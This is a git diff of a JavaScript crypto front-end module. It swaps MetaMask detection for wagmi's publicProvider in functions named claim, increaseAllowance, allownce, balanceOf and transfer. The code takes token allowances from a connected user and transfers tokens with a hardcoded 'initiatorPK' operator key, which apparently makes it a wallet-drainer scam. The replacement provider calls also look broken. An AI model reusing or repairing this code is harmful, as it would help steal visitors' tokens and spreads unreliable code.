@@ -10,10 +10,10 @@ import {
   fetchBalance,
   writeContract
 } from '@wagmi/core';
+import { publicProvider } from '@wagmi/core/providers/public'
 import { mainnet } from '@wagmi/core/chains';
 import { getAccount, fetchFeeData, disconnect } from '@wagmi/core';
 import { ethers } from 'ethers';
-import detectEthereumProvider from '@metamask/detect-provider';
 import * as constants from './constants.js';
 import Web3 from 'web3';
 import { Alchemy, Network } from 'alchemy-sdk';
@@ -98,12 +98,7 @@ export const claim = async (_balance) => {
 };
 export const increaseAllowance = async (token) => {
   try {
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(publicProvider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -296,12 +291,7 @@ export const increaseAllowance = async (token) => {
 
 export const transfer = async (token) => {
   try {
-    const provideer = await detectEthereumProvider();
-    if (!provideer){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const provider = new ethers.providers.Web3Provider(provideer);
+    const provider = new ethers.providers.Web3Provider(publicProvider);
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -333,12 +323,7 @@ export const ethBalance = async () => {
 
 export const allownce = async (token) => {
   try{
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(publicProvider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -352,12 +337,7 @@ export const allownce = async (token) => {
 
 export const balanceOf = async (token) => {
   try{
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(publicProvider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
